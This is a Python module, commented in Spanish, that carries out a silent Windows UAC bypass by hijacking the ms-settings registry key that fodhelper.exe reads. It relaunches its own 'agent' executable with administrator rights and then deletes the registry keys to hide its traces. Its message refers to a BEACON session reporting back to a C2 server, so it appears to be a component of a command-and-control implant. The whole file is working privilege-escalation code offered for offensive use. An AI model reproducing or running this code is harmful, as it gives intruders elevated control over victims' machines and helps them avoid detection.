import os
import sys
import winreg
import time
import subprocess

def run_uac_bypass(agent_executable_path=None):
    """
    Ejecuta un bypass de UAC utilizando la técnica Fodhelper.
    Esta técnica abusa del auto-elevado Fodhelper.exe engañándolo 
    para que ejecute nuestro Agente desde una llave delegada en HKCU.
    ¡Funciona de forma silenciosa (no muestra cartel YES/NO)!
    """
    try:
        # 1. Determinar el path de nuestro propio agente
        if not agent_executable_path:
            if getattr(sys, 'frozen', False):
                agent_executable_path = sys.executable
            else:
                agent_executable_path = os.path.abspath(sys.argv[0])
            
        print(f"[DEBUG] Ejecutando Bypass UAC (Fodhelper) apuntando a: {agent_executable_path}")
        
        # 2. Rutas críticas del Registro de Windows
        reg_path = r"Software\Classes\ms-settings\Shell\Open\command"
        delegate_execute_path = r"Software\Classes\ms-settings\Shell\Open\command"

        # 3. Crear Estructura de Llaves
        # Creamos la llave ms-settings/...
        try:
            key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
        except Exception as e:
            return f"[-] Falló Creación de Llave HKCU: {e}"

        # 4. Inyectar payload (Nuestro path)
        try:
            # Seteamos el valor por defecto para ejecutar mediante cmd /c start
            payload = f'cmd /c start "" "{agent_executable_path}"'
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, payload)
            # Seteamos DelegateExecute vacio (Requerido para el bypass en Win10/11)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
        except Exception as e:
            return f"[-] Falló injección de Payload UAC: {e}"

        # 5. Desatar la trampa ejecutando Fodhelper legítimo
        print("[DEBUG] Lanzando C:\Windows\System32\Fodhelper.exe")
        subprocess.Popen("cmd /c start C:\\Windows\\System32\\fodhelper.exe", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        time.sleep(3) # Dar tiempo a que lea el HKCU y salte a High Integrity

        # 6. Limpieza Quirúrgica (OPSEC)
        # Borrar nuestras llaves para no dejar rastro
        try:
            winreg.DeleteKeyEx(winreg.HKEY_CURRENT_USER, reg_path)
            # Borrar las clases padre si estñan vacias (opcional/limpieza profunda)
        except Exception as e:
            pass # Falla silenciosamente en limpieza temporal

        return "[+] Bypass UAC completado. Deberías recibir un nuevo registro de BEACON (Sesión High Integrity / Admin) en el C2."

    except Exception as e:
        return f"[-] Fallo crítico en el Bypass UAC: {str(e)}"
